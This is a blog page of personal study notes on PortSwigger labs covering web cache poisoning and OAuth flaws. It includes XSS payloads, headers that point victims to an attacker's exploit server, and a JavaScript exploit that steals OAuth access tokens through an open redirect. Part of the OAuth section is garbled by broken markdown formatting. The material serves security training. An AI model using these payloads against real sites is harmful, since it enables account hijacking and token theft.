<h4 id="lab-web-cache-poisoning-with-an-unkeyed-cookie">Lab: Web cache
poisoning with an unkeyed cookie</h4>
<ol type="1">
<li><p>load homepage, send request to repeater,add cache buster query
parameter,send<img
src="https://s2.loli.net/2023/08/30/XMOErBqd8h7DRT5.png"
alt="image-20230830020552467" /></p></li>
<li><p>Place a suitable XSS payload in the <code>fehost</code>
cookie</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">fehost<span class="token operator">=</span>someString<span class="token string">"-alert(1)-"</span>someString</code></pre></li>
<li><p>delete query parameter, repeatedly sending
request:<code>X-cache:hit</code></p></li>
</ol>
<h4 id="lab-web-cache-poisoning-with-multiple-headers">Lab: Web cache
poisoning with multiple headers</h4>
<ol type="1">
<li>attention: this request<img
src="https://s2.loli.net/2023/08/30/XpmbwtR612g3dvy.png"
alt="image-20230830025750939" /></li>
<li>craft an exploit<img
src="https://s2.loli.net/2023/08/30/fGAlM4u6HozO8RY.png"
alt="image-20230830025809355" /></li>
</ol>
<h4 id="lab-targeted-web-cache-poisoning-using-an-unknown-header">Lab:
Targeted web cache poisoning using an unknown header</h4>
<ol type="1">
<li><p>With the Param Miner extension enabled, right-click on the
request and select "Guess headers". After a while, Param Miner will
report that there is a secret input in the form of the
<code>X-Host</code> header<img
src="https://s2.loli.net/2023/08/30/n1c3xTH9V6QlFut.png"
alt="image-20230830035435896" /><img
src="https://s2.loli.net/2023/08/30/R2uLA5iGBsnY6Sk.png"
alt="image-20230830035516347" /></p></li>
<li><p>Notice that the <code>Vary</code> header is used to specify that
the <code>User-Agent</code> is part of the cache key. To target the
victim, you need to find out their <code>User-Agent</code>.<img
src="https://s2.loli.net/2023/08/30/xmlSHUJPfAGcENZ.png"
alt="image-20230830035616434" /></p></li>
<li><p>On the website, notice that the comment feature allows certain
HTML tags. Post a comment containing a suitable payload to cause the
victim's browser to interact with your exploit server, for example:</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></code></pre></li>
<li><p>Go to the exploit server and click the button to open the "Access
log". Refresh the page every few seconds until you see requests made by
a different user. This is the victim. Copy their <code>User-Agent</code>
from the log<img
src="https://s2.loli.net/2023/08/30/fPEWQGS6Own9IbK.png"
alt="image-20230830035809980" /></p></li>
<li><p>modify the <code>User-Agent</code><img
src="https://s2.loli.net/2023/08/30/y9o2lucfSzAYb4p.png"
alt="image-20230830035919693" /></p></li>
</ol>
<h4
id="lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria">Lab:
Web cache poisoning to exploit a DOM vulnerability via a cache with
strict cacheability criteria</h4>
<ol type="1">
<li><p>Use <code>Param Miner</code> to identify that the
X-Forwarded-Host header is supported.</p></li>
<li><p>Notice that this header overwrites the <code>data.host</code>
variable, which is passed into the <code>initGeoLocate()</code>
function.<img src="https://s2.loli.net/2023/08/30/QUZWsIX7cSHL6tJ.png"
alt="image-20230830140725833" /><img
src="https://s2.loli.net/2023/08/30/Itpf41bv7LREXcM.png" /></p></li>
<li><p>Study the <code>initGeoLocate</code>() function in
<code>/resources/js/geolocate.js</code> and notice that it is vulnerable
to <code>DOM-XSS</code> due to the way it handles the incoming JSON
data.</p></li>
<li><p>craft an exploit<img
src="https://s2.loli.net/2023/08/30/hPjGimFxfYEWXB8.png"
alt="image-20230830141110187" /></p></li>
<li><p>In Burp Repeater, add the following header, remembering to enter
your own exploit server ID:</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">X-Forwarded-Host</span><span class="token punctuation">:</span> <span class="token header-value">YOUR-EXPLOIT-SERVER-ID.exploit-server.net</span></span></code></pre></li>
</ol>
<h4 id="lab-combining-web-cache-poisoning-vulnerabilities">Lab:
Combining web cache poisoning vulnerabilities</h4>
<ol type="1">
<li>In Burp Repeater, experiment with the <code>X-Forwarded-Host</code>
header and observe that it can be used to import an arbitrary JSON file
instead of the <code>translations.json</code> file, which contains
translations of UI texts.</li>
<li>Notice that the website is vulnerable to DOM-XSS due to the way the
<code>initTranslations()</code> function handles data from the JSON file
for all languages except English.</li>
<li>Observe that the <code>X-Original-URL</code> can be used to change
the path of the request, so you can explicitly set
<code>/setlang/es</code>. However, you will find that this response
cannot be cached because it contains the <code>Set-Cookie</code>
header.<img src="https://s2.loli.net/2023/08/30/oEM1K7bPxqlgsck.png"
alt="image-20230830161720060" /></li>
<li>Observe that the home page sometimes uses backslashes as a folder
separator. Notice that the server normalizes these to forward slashes
using a redirect. Therefore, <code>X-Original-URL: /setlang\es</code>
triggers a 302 response that redirects to <code>/setlang/es</code>.
Observe that this 302 response is cacheable and, therefore, can be used
to force other users to the Spanish version of the home page.<img
src="https://s2.loli.net/2023/08/30/iN6zo8QBD97bnKI.png" /></li>
<li>posion two requests
<ol type="1">
<li>You now need to combine these two exploits. First, poison the
<code>GET /?localized=1</code> page using the
<code>X-Forwarded-Host</code> header to import your malicious JSON file
from the exploit server.</li>
<li>Now, while the cache is still poisoned, also poison the
<code>GET /</code> page using <code>X-Original-URL: /setlang\es</code>
to force all users to the Spanish page.</li>
</ol></li>
</ol>
<h4 id="exploiting-cache-implementation-flaws">Exploiting cache
implementation flaws</h4>
<ol type="1">
<li>A <code>cache oracle</code> is simply a page or endpoint that
provides feedback about the cache's behavior.</li>
</ol>
<h4 id="cache-probing-methodology">Cache probing methodology</h4>
<ol type="1">
<li>Identify a suitable cache oracle</li>
<li>Probe key handling</li>
</ol>
<h4 id="identify-an-exploitable-gadget">Identify an exploitable
gadget</h4>
<hr />
<h4 id="lab-web-cache-poisoning-via-an-unkeyed-query-string">Lab: Web
cache poisoning via an unkeyed query string</h4>
<ol type="1">
<li><p>you can use the <code>Pragma: x-get-cache-key</code> header to
display the cache key in the response.</p></li>
<li><p>Although you can't use a query parameter as a cache buster, there
is a common request header that will be keyed if present. You can use
the <code>Param Miner</code> extension to automatically add a cache
buster header to your requests.</p></li>
<li><p>Notice that <code>Homepage</code> is a potential cache oracle.
Send the request to Burp Repeater.</p></li>
<li><p>Notice that you can use the <code>Origin</code> header as a cache
buster. Add it to your request.<img
src="https://s2.loli.net/2023/08/30/QiDpArafkRXqFIo.png"
alt="image-20230830191914020" /></p></li>
<li><p>Add an arbitrary parameter that breaks out of the reflected
string and injects an <a
target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting">XSS</a>
payload:<img src="https://s2.loli.net/2023/08/30/x3vXHdsTqaIU9my.png"
alt="image-20230830192305902" /></p>
<pre class="language-http" data-language="http"><code class="language-http">GET /?evil='/>&lt;script>alert(1)&lt;/script></code></pre></li>
<li><p>To simulate the victim, <strong>remove</strong> the query string
from your request and send it again (while using the same cache buster).
Check that you still receive the cached response containing your
payload.<img src="https://s2.loli.net/2023/08/30/OQDszH5c73xSRXp.png"
alt="image-20230830192313590" /></p></li>
<li><p>Remove the cache-buster <code>Origin</code> header and add your
payload back to the query string.. Replay the request until you have
poisoned the cache for normal users.<img
src="https://s2.loli.net/2023/08/30/rSYpEA6nZKmke7I.png"
alt="image-20230830192428705" /></p></li>
<li><p>load original homepage</p></li>
</ol>
<h4 id="lab-web-cache-poisoning-via-an-unkeyed-query-parameter">Lab: Web
cache poisoning via an unkeyed query parameter</h4>
<ol type="1">
<li>Use Param Miner's "Guess GET parameters" feature to identify that
the parameter <code>utm_content</code> is supported by the
application.<strong>Not sure</strong> which specific functionality
option to choose.<img
src="https://s2.loli.net/2023/08/30/GYD4jysud5cxOh6.png"
alt="image-20230830231938057" /></li>
<li>send <strong>request1</strong> to <code>repeater</code>,
<code>Origin</code> parameter is redundant here<img
src="https://s2.loli.net/2023/08/30/dHnaKFGTeq3J5tv.png"
alt="image-20230830232028525" /></li>
<li>remove <code>utm_content</code>, send again</li>
</ol>
<h4 id="cache-parameter-cloaking">Cache parameter cloaking</h4>
<ol type="1">
<li><p>Of particular interest are any parsing
<strong>discrepancies</strong> between the cache and the application.
This can potentially allow you to sneak arbitrary parameters into the
application logic by "<strong>cloaking</strong>" them in an excluded
parameter.</p></li>
<li><p>Let's assume that the algorithm for excluding parameters from the
cache key behaves in this way, but the server's algorithm only accepts
the <strong>first</strong> <code>?</code> as a delimiter. Consider the
following request:</p>
<pre class="language-http" data-language="http"><code class="language-http">GET /?example=123?excluded_param=bad-stuff-here</code></pre></li>
</ol>
<h4 id="lab-parameter-cloaking">Lab: Parameter cloaking</h4>
<ol type="1">
<li>craft an exploit<img
src="https://s2.loli.net/2023/08/31/wBTjr9XQELxVlKS.png"
alt="image-20230831005611948" /></li>
</ol>
<h4 id="lab-web-cache-poisoning-via-a-fat-get-request">Lab: Web cache
poisoning via a fat GET request</h4>
<ol type="1">
<li>craft an exploit<img
src="https://s2.loli.net/2023/08/31/cbBg5hPaDXprO9n.png"
alt="image-20230831012140343" /></li>
</ol>
<h4 id="lab-url-normalization">Lab: URL normalization</h4>
<ol type="1">
<li>poison the cache<img
src="https://s2.loli.net/2023/08/31/nv7yCkiE92lrohw.png"
alt="image-20230831020310877" /></li>
<li>immediately load the URL in the browser.</li>
</ol>
<h4 id="cache-key-injection">Cache key injection</h4>
<ol type="1">
<li><p><strong>!important</strong>:use http/1.1<img
src="https://s2.loli.net/2023/08/31/3ljt4S6hqAwpCiJ.png"
alt="image-20230831180830030" /></p></li>
<li><p>If the cache doesn't implement proper
<code>escaping of the delimiters</code> between the components, you can
potentially exploit this behavior to craft two
<strong>different</strong> requests that have the same cache
key.</p></li>
<li><p>Observe that the redirect at <code>/login</code> excludes the
parameter <code>utm_content</code> from the cache key using a flawed
regex. This allows you append arbitrary unkeyed content to the
<code>lang</code> parameter:</p>
<pre class="language-http" data-language="http"><code class="language-http">/login?lang=en?utm_content=anything</code></pre>
<figure>
<img src="https://s2.loli.net/2023/08/31/O2uICQzDeKxPlsh.png"
alt="image-20230831180857955" />
<figcaption aria-hidden="true">image-20230831180857955</figcaption>
</figure></li>
<li><p>Observe that the page at <code>/login/</code> has an import from
<code>/js/localize.js</code>. This is vulnerable to client-side
parameter pollution via the <code>lang</code> parameter because it
doesn't URL-encode the value.</p></li>
<li><p>Observe that the login page references an endpoint at
<code>/js/localize.js</code> that is vulnerable to response header
injection via the <code>Origin</code> request header, provided the
<code>cors</code> parameter is set to <code>1</code>.</p>
<ol type="1">
<li>posion cache1<img
src="https://s2.loli.net/2023/08/31/FuWmRbe6wONsxcP.png"
alt="image-20230831180930482" /></li>
<li>posion cache2: Make sure the previous request <strong>hits</strong>
the cache.<img src="https://s2.loli.net/2023/08/31/4MdIkveqSufhHGQ.png"
alt="image-20230831181505693" /></li>
</ol></li>
<li><p>Use the <code>Pragma: x-get-cache-key</code> header to identify
that the server is vulnerable to cache key injection, meaning the header
injection can be triggered via a crafted URL.</p></li>
</ol>
<h4 id="poisoning-internal-caches">Poisoning internal caches</h4>
<ol type="1">
<li>some websites implement caching behavior <strong>directly</strong>
into the application in addition to using a distinct,
<code>external</code> component. This can have several advantages, such
as avoiding the kind of parsing <strong>discrepancies</strong> we looked
at earlier.</li>
<li>Users might then receive a response comprising a
<strong>mixture</strong> of content from the server, as well as several
individual fragments from the cache.</li>
<li>As these cached fragments are intended to be reusable across
multiple distinct responses, the concept of a cache key
<strong>doesn't</strong> really apply.</li>
<li>especially if you poison a fragment that is used on every page. As
there is no cache key, you would have poisoned every page, for every
user, with a single request.</li>
</ol>
<h5 id="how-to-identify-internal-caches">How to identify internal
caches</h5>
<ol type="1">
<li>if the response reflects a <strong>mixture</strong> of both input
from the last request you sent and input from a previous request, this
is a key indicator that the cache is storing fragments rather than
entire responses.</li>
<li>The same applies if your input is reflected in responses on
<strong>multiple</strong> distinct pages, in particular on pages in
which you <strong>never</strong> tried to inject your input.</li>
</ol>
<h4 id="lab-internal-cache-poisoning">Lab: Internal cache poisoning</h4>
<ol type="1">
<li><p>Observe that the <code>X-Forwarded-Host</code> header is
supported. Add this to your request, containing your exploit server
URL:<img src="https://s2.loli.net/2023/08/31/quFdZPj2BozScxL.png"
alt="image-20230831204020522" /></p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">X-Forwarded-Host</span><span class="token punctuation">:</span> <span class="token header-value">YOUR-EXPLOIT-SERVER-ID.exploit-server.net</span></span></code></pre></li>
<li><p>Send the request. most of the time, you will see that the URL for
the <code>canonical link</code> element and the
<code>analytics.js</code> import now both point to your exploit server,
but the <code>geolocate.js</code> import URL remains the same.<img
src="https://s2.loli.net/2023/08/31/kqHwRWs6LjoOnY7.png"
alt="image-20230831204034127" /></p></li>
<li><p>Keep sending the request. Eventually, the URL for the
<code>geolocate.js</code> resource will also be
<strong>overwritten</strong> with your exploit server URL. This
<strong>indicates</strong> that this fragment is being cached separately
by the internal cache. Notice that you've been getting a cache hit for
this fragment even with the cache-buster query parameter - the query
string is unkeyed by the internal cache.<img
src="https://s2.loli.net/2023/08/31/CRmjuIq7O3fnF82.png"
alt="image-20230831204159068" /></p></li>
<li><p>Remove the <code>X-Forwarded-Host</code> header and resend the
request. Notice that the internally cached fragment still reflects your
exploit server URL, but the other two URLs <strong>do
not</strong></p></li>
<li><p>Go to the exploit server and create a file at
<code>/js/geolocate.js</code> containing the payload
<code>alert(document.cookie)</code>. Store the exploit.</p></li>
</ol>
<h3 id="oauthentication-vulnerabilities">Oauthentication
vulnerabilities</h3>
<h4 id="oauth-2.0-authentication-vulnerabilities">OAuth 2.0
authentication vulnerabilities</h4>
<ol type="1">
<li><code>OAuth</code> is a commonly used authorization framework that
enables websites and web applications to request
<code>limited access</code> to a user's account on another
application.</li>
<li>OAuth allows the user to grant this access without exposing their
login credentials to the requesting application.This means users can
fine-tune which data they want to share <strong>rather than</strong>
having to hand over full control of their account to a third party.</li>
<li>For example, an application might use OAuth to request access to
your email contacts list so that it can suggest people to connect with.
However, the same mechanism is also used to provide
<code>third-party</code> authentication services, allowing users to log
in with an account that they have with a different website.</li>
<li><code>OAuth 2.0</code> was written from scratch rather than being
developed directly from <code>OAuth 1.0</code>. As a result, the two are
very different.</li>
</ol>
<h4 id="how-does-oauth-2.0-work">How does OAuth 2.0 work?</h4>
<ol type="1">
<li>OAuth 2.0 was originally developed as a way of
<code>sharing access</code> to specific data <strong>between
applications</strong>.</li>
<li>It works by defining a series of interactions between
<code>three distinct parties</code>, namely a client application, a
resource owner, and the OAuth service provider
<ol type="1">
<li><strong>Client application</strong> - The website or web application
that wants to access the user's data.</li>
<li><strong>Resource owner</strong> - The user whose data the client
application wants to access.</li>
<li><strong>OAuth service provider</strong> - The website or application
that controls the user's data and access to it. They support OAuth by
providing an API for interacting with both an authorization server and a
resource server.</li>
</ol></li>
<li>In this topic, we'll focus on the "<code>authorization code</code>"
and "<code>implicit</code>" grant types as these are by far the most
common. Broadly speaking, both of these grant types involve the
following stages:
<ol type="1">
<li>The client application <code>requests</code> access to a subset of
the user's data, specifying which grant type they want to use and what
kind of access they want.</li>
<li>The user is prompted to log in to the OAuth service and explicitly
<code>give their consent</code> for the requested access.</li>
<li>The client application <code>receives a unique access</code> token
that proves they have permission from the user to access the requested
data. Exactly how this happens varies significantly depending on the
grant type.</li>
<li>The client application uses this access token to
<code>make API calls</code> fetching the relevant data from the resource
server.</li>
</ol></li>
</ol>
<h4 id="oauth-grant-types">OAuth grant types</h4>
<ol type="1">
<li><p>The OAuth grant type determines the
<code>exact sequence of steps</code> that are involved in the OAuth
process The grant type also affects <strong>how</strong> the client
application <strong>communicates</strong> with the OAuth service at each
stage, including how the access token itself is sent. For this reason,
grant types are often referred to as "<code>OAuth flows</code>"</p></li>
<li><p><code>scope</code> parameter of the authorization request:</p>
<ol type="1">
<li>specify which data</li>
<li>operations to perform</li>
</ol></li>
<li><p>The user is asked whether they consent to the requested access.
If they accept, the client application is granted an
"<code>authorization code</code>".</p></li>
<li><p><code>Authorization code grant type</code><img
src="https://s2.loli.net/2023/11/30/VjJYqgTPpi72h1o.jpg"
alt="oauth-authorization-code-flow" /></p>
<ol type="1">
<li>```http redirect_uri <pre class="language-none"><code class="language-none">
      The URI to which the user&#39;s browser should be redirected when sending the authorization code to the client application. This is also known as the &quot;callback URI&quot; or &quot;callback endpoint&quot;. Many OAuth attacks are based on exploiting flaws in the validation of this parameter.
5. &#96;Implicit grant type&#96;

   1. When using the implicit grant type, **all** communication happens via browser redirects - there is no secure back-channel like in the authorization code flow. ![oauth-implicit-flow](https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;11&#x2F;30&#x2F;WPvLZCAsRoqhDwl.jpg)

#### OAuth authentication

1. For example, you&#39;re probably familiar with the option many websites provide to log in using your **existing social media account** rather than having to register with the website in question. Whenever you see this option, there&#39;s a good chance it is built on OAuth 2.0.

#### Lab: Authentication bypass via OAuth implicit flow

1. click &quot;&#96;&#96;my-account&#96;&quot; to login, make sure that &quot;&#96;intercept is on&#96;&quot;,整个过程产生如下请求：![image-20231130053132897](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;Jf710001011&#x2F;pictureBed@main&#x2F;img&#x2F;202311300531022.png)
2. 最为关键的请求为：&#96;POST &#x2F;authenticate&#96;,send to &#96;repeat&#96; 
   1. modify the &quot;&#96;email&#96;&quot; to carlos&#39;![image-20231130053149716](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;Jf710001011&#x2F;pictureBed@main&#x2F;img&#x2F;202311300531839.png)

#### How do OAuth authentication vulnerabilities arise?

1. Regardless of which OAuth grant type is being used, the &#96;first request&#96; of the flow will always be a request to the &#96;&#x2F;authorization&#96; endpoint containing a number of query parameters that are used specifically for OAuth.

2. Once you know the &#96;hostname of the authorization server&#96;, you should always try sending a &#96;GET&#96; request to the following standard endpoints:

   &#96;&#96;&#96;http
   &#x2F;.well-known&#x2F;oauth-authorization-server
   &#x2F;.well-known&#x2F;openid-configuration</code></pre></li>
</ol></li>
<li><p>Vulnerabilities can arise in the client
<code>application's implementation of OAuth</code> as well as in the
<code>configuration of the OAuth service itself</code></p></li>
</ol>
<h4 id="improper-implementation-of-the-implicit-grant-type">Improper
implementation of the implicit grant type</h4>
<ol type="1">
<li>The <strong>trouble</strong> is, if the application wants to
maintain the session after the user closes the page, it needs to store
the <code>current user data</code> (normally a user ID and the access
token) somewhere.</li>
<li>if the client application doesn't properly check that the access
token <strong>matches</strong> the other data in the request</li>
</ol>
<h4 id="flawed-csrf-protection">Flawed CSRF protection</h4>
<ol type="1">
<li>Therefore, if you notice that the authorization request <strong>does
not</strong> send a <code>state</code> parameter, this is extremely
interesting from an attacker's perspective.</li>
<li>In this case, if the application fails to use the <code>state</code>
parameter, an attacker could potentially hijack a victim user's account
on the client application <strong>by</strong> binding it to their own
social media account.</li>
</ol>
<h4 id="lab-forced-oauth-profile-linking">Lab: Forced OAuth profile
linking</h4>
<ol type="1">
<li>use a <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF
attack</a> to attach your own social media profile to the
<code>admin</code> user's account on the blog website, then access the
admin panel and delete <strong>carlos</strong>.</li>
</ol>
<hr />
<ol type="1">
<li>login with with your <code>username &amp; password</code><img
src="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020918908.png"
alt="image-20231202091806699" /></li>
<li>Attach a social profile<img
src="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020919483.png"
alt="image-20231202091911343" /></li>
<li>use your social media credentials to complete the OAuth flow.<img
src="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020920725.png"
alt="image-20231202092024607" /></li>
<li>In the proxy history, study the series of
<code>requests for attaching a social profile</code><img
src="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020921785.png"
alt="image-20231202092128689" />
<ol type="1">
<li>In the <code>GET /auth?client_id[...]</code> request, observe that
the <code>redirect_uri</code> for this functionality sends the
authorization code to <code>/oauth-linking</code> ; Importantly, notice
that the request does not include a <code>state</code> parameter to
protect against CSRF attacks.</li>
</ol></li>
<li>Turn on proxy interception and select the "Attach a social profile"
option again.
<ol type="1">
<li>forward until you see this request<img
src="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020926304.png"
alt="image-20231202092630082" />
<ol type="1">
<li>right click,copy url<img
src="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020927421.png"
alt="image-20231202092716289" /></li>
<li>make an exploit<img
src="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020929714.png"
alt="xx" /></li>
<li>Deliver exploit to victim</li>
<li>observe the access log<img
src="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020930778.png"
alt="image-20231202093043613" /></li>
</ol></li>
</ol></li>
<li>refresh the web page<img
src="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020932627.png"
alt="image-20231202093204506" /></li>
</ol>
<hr />
<ol type="1">
<li>Note that if the site allows users to log in
<strong>exclusively</strong> via OAuth, the <code>state</code> parameter
is arguably less critical. However, not using a <code>state</code>
parameter can still allow attackers to construct login <code>CSRF</code>
attacks, whereby the user is tricked into logging in to the attacker's
account.</li>
</ol>
<h4 id="lab-oauth-account-hijacking-via-redirect_uri">Lab: OAuth account
hijacking via redirect_uri</h4>
<ol type="1">
<li><p>observe the two requests</p>
<ol type="1">
<li><p><code>GET /auth?client_id=nf3e8gcgjtehcvqgsgf5k&amp;redirect_uri=https://0a2f00220493cb5080aa03c600510087.web-security-academy.net/oauth-callback&amp;response_type=code&amp;scope=openid%20profile%20email</code></p>
<p>observe that you can submit any arbitrary value as the
<code>redirect_uri</code> without encountering an error</p></li>
<li><p><code>GET /oauth-callback?code=ufujmlosSlAWkD7MjsXil1YQsfeSOdApTCuSTRFNFW</code></p></li>
</ol></li>
<li><p>make an exploit<img
src="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312061431185.png"
alt="image-20231206143134950" /></p></li>
<li><p>inspect <strong>access log</strong><img
src="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312061432281.png"
alt="image-20231206143255126" /></p>
<ol type="1">
<li>Copy code</li>
</ol></li>
<li><p>paste here<img
src="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312061433237.png"
alt="image-20231206143342093" /></p></li>
</ol>
<h4 id="flawed-redirect_uri-validation">Flawed redirect_uri
validation</h4>
<ol type="1">
<li>when the OAuth service receives a new request, it can validate the
redirect_uri parameter against this <code>whitelist</code>. In this
case, supplying an external URI will likely result in an error.</li>
</ol>
<h4 id="lab-stealing-oauth-access-tokens-via-an-open-redirect">Lab:
Stealing OAuth access tokens via an open redirect</h4>
<ol type="1">
<li>Flawed validation by the OAuth service makes it possible for an
attacker to <code>leak access tokens</code> to <strong>arbitrary
pages</strong> on the client application</li>
<li>identify an <code>open redirect</code> on the blog website and use
this to steal an <code>access token</code> for the admin user's
accoun</li>
</ol>
<hr />
<ol type="1">
<li><p>In Repeater, experiment with the
<code>GET /auth?client_id=[...]</code> request. Observe that you cannot
supply an external domain as <code>redirect_uri</code> because it's
being validated against a whitelist. However, you can append additional
characters to the default value without encountering an error, including
the <code>/../</code> path traversal sequence.<img
src="https://s2.loli.net/2023/12/08/VczaSCoXsxt5Qkr.png"
alt="image-20231208145453412" /></p></li>
<li><p>Confirm that the <code>redirect_uri</code> parameter is in fact
vulnerable to <a href="#directory-traversal">directory traversal</a> by
changing it to:</p>
<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;YOUR-LAB-ID.web-security-academy.net&#x2F;oauth-callback&#x2F;..&#x2F;post?postId&#x3D;1</code></pre>
<p>Forward any remaining requests and observe that you are eventually
redirected to the first blog post. In the browser, notice that your
<code>access token</code> is included in the URL as a fragment.<img
src="https://s2.loli.net/2023/12/08/JrQV2l7dfj3Keaq.png"
alt="image-20231208145622642" /></p></li>
<li><p>Identify the "<strong>Next post</strong>" option at the bottom of
each blog post, which works by redirecting users to the path specified
in a query parameter. Send the corresponding
<code>GET /post/next?path=[...]</code> request to Repeater.<img
src="https://s2.loli.net/2023/12/08/6EqefrnBm5XJyQO.png"
alt="image-20231208145718124" /></p></li>
<li><p>make an exploit</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&amp;response_type=token&amp;nonce=399721827&amp;scope=openid%20profile%20email'</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'/?'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<ol type="1">
<li><strong>window.location:</strong> representing the current browsing
context, including the current URL</li>
<li><strong>document.location.hash</strong>: if the current URL is
<code>https://example.com/page#section1</code>, the
<code>document.location.hash</code> would be
<code>#section1</code>.</li>
<li><strong>substr(1)</strong>: By passing <code>1</code> as the
argument, it removes the leading <code>#</code> symbol from the fragment
identifier</li>
<li><strong>/?</strong>: This string is prepended to the extracted
fragment identifier</li>
</ol></li>
<li><p>inspect access log<img
src="https://s2.loli.net/2023/12/08/qjJ2rG3ZfmsYT1D.png"
alt="image-20231208150921562" /></p></li>
<li><p>back to: <code>GET /me</code> ,get <code>apikey</code><img
src="https://s2.loli.net/2023/12/08/5t4aDx3vs7CXB6G.png"
alt="image-20231208151012038" /></p></li>
</ol>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        Author:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Jf710001011</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        Link:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://Jf710001011.github.io/2023/03/06/portswigger/">https://Jf710001011.github.io/2023/03/06/portswigger/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        Reprint policy:
                    </i>
                </span>
                <span class="reprint-info">
                    All articles in this blog are used except for special statements
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    reprint polocy. If reproduced, please indicate source
                    <a href="/about" target="_blank">Jf710001011</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/Web/">
                                    <span class="chip bg-color">Web</span>
                                </a>
                            
                                <a href="/tags/Lab/">
                                    <span class="chip bg-color">Lab</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
